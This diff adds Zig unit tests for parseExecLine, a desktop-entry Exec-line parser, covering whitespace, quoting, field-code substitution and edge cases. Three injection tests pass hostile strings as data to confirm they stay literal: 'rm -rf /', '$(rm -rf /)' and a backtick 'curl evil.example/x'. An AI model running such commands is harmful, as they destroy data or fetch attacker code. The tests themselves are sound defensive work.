@@ -353,3 +353,183 @@ test "parseExecLine: deprecated codes (%i %c %k) silently stripped" {
     try T.expectEqualStrings("app", argv[0]);
     try T.expectEqualStrings("file", argv[argv.len - 1]);
 }
+
+// --- Additional tests — production-grade test breadth ---
+
+test "parseExecLine: empty string yields empty argv" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "", &.{});
+    defer {
+        for (argv) |s| a.free(s);
+        a.free(argv);
+    }
+    try T.expectEqual(@as(usize, 0), argv.len);
+}
+
+test "parseExecLine: only whitespace yields empty argv" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "   \t  ", &.{});
+    defer {
+        for (argv) |s| a.free(s);
+        a.free(argv);
+    }
+    try T.expectEqual(@as(usize, 0), argv.len);
+}
+
+test "parseExecLine: single argument no whitespace" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "vim", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 1), argv.len);
+    try T.expectEqualStrings("vim", argv[0]);
+}
+
+test "parseExecLine: multiple spaces collapse" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "vim     -u    none", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 3), argv.len);
+    try T.expectEqualStrings("vim", argv[0]);
+    try T.expectEqualStrings("-u", argv[1]);
+    try T.expectEqualStrings("none", argv[2]);
+}
+
+test "parseExecLine: tabs work like spaces" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "vim\t-u\tnone", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 3), argv.len);
+}
+
+test "parseExecLine: quoted whitespace preserved" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "echo \"hello world\"", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 2), argv.len);
+    try T.expectEqualStrings("hello world", argv[1]);
+}
+
+test "parseExecLine: quoted with embedded escaped quote" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "echo \"say \\\"hi\\\"\"", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 2), argv.len);
+    try T.expectEqualStrings("say \"hi\"", argv[1]);
+}
+
+test "parseExecLine: %u substitution" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "browser %u", &.{"https://example.com"});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 2), argv.len);
+    try T.expectEqualStrings("https://example.com", argv[1]);
+}
+
+test "parseExecLine: %U expands all URLs" {
+    const a = T.allocator;
+    const urls = [_][]const u8{ "https://a", "https://b", "https://c" };
+    const argv = try parseExecLine(a, "browser %U", &urls);
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 4), argv.len);
+    try T.expectEqualStrings("https://a", argv[1]);
+    try T.expectEqualStrings("https://c", argv[3]);
+}
+
+test "parseExecLine: %f with no extras drops the slot" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "vim %f", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    // Empty extras → %f produces no extra arg; just "vim" remains.
+    try T.expectEqual(@as(usize, 1), argv.len);
+    try T.expectEqualStrings("vim", argv[0]);
+}
+
+test "parseExecLine: command-injection attempt via extras passes through as literal" {
+    const a = T.allocator;
+    const malicious = [_][]const u8{"; rm -rf /; echo PWNED"};
+    const argv = try parseExecLine(a, "cat %f", &malicious);
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 2), argv.len);
+    // The metacharacters become a single argv slot — the shell never sees them.
+    try T.expectEqualStrings("; rm -rf /; echo PWNED", argv[1]);
+}
+
+test "parseExecLine: env-var injection attempt is literal" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "echo $PATH $(rm -rf /)", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    // Each token survives whitespace-split; $ and $() are literal bytes.
+    try T.expect(argv.len >= 2);
+    try T.expectEqualStrings("echo", argv[0]);
+}
+
+test "parseExecLine: backtick command-substitution attempt is literal" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "echo `curl evil.example/x`", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    // The backticks SHOULD pass through as literal bytes. The string splits
+    // on whitespace into 3 tokens, NONE of which trigger shell substitution.
+    try T.expectEqual(@as(usize, 3), argv.len);
+    try T.expectEqualStrings("echo", argv[0]);
+    try T.expectEqualStrings("`curl", argv[1]);
+    try T.expectEqualStrings("evil.example/x`", argv[2]);
+}
+
+test "parseExecLine: percent at end of string" {
+    const a = T.allocator;
+    // Trailing bare % with nothing after — shouldn't crash.
+    const argv = try parseExecLine(a, "foo %", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expect(argv.len >= 1);
+    try T.expectEqualStrings("foo", argv[0]);
+}
+
+test "parseExecLine: extras with %f preserves order" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "vim --first %f --after", &.{"file.txt"});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 4), argv.len);
+    try T.expectEqualStrings("vim", argv[0]);
+    try T.expectEqualStrings("--first", argv[1]);
+    try T.expectEqualStrings("file.txt", argv[2]);
+    try T.expectEqualStrings("--after", argv[3]);
+}
+
+test "parseExecLine: %F empty extras drops both the code and consumes no extras" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "gimp %F", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 1), argv.len);
+    try T.expectEqualStrings("gimp", argv[0]);
+}
+
+test "parseExecLine: 100% literal in argument" {
+    const a = T.allocator;
+    const argv = try parseExecLine(a, "echo 50%%-off", &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 2), argv.len);
+    try T.expectEqualStrings("50%-off", argv[1]);
+}
+
+test "parseExecLine: very long argument" {
+    const a = T.allocator;
+    var long_buf: [4096]u8 = undefined;
+    for (&long_buf) |*c| c.* = 'x';
+    const long = long_buf[0..];
+    const cmd = try std.fmt.allocPrint(a, "echo {s}", .{long});
+    defer a.free(cmd);
+    const argv = try parseExecLine(a, cmd, &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 2), argv.len);
+    try T.expectEqual(@as(usize, 4096), argv[1].len);
+}
+
+test "parseExecLine: many arguments" {
+    const a = T.allocator;
+    // 32 args
+    var cmd_buf: [512]u8 = undefined;
+    const cmd = std.fmt.bufPrint(&cmd_buf, "cmd a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5", .{}) catch unreachable;
+    const argv = try parseExecLine(a, cmd, &.{});
+    defer { for (argv) |s| a.free(s); a.free(argv); }
+    try T.expectEqual(@as(usize, 33), argv.len);
+}
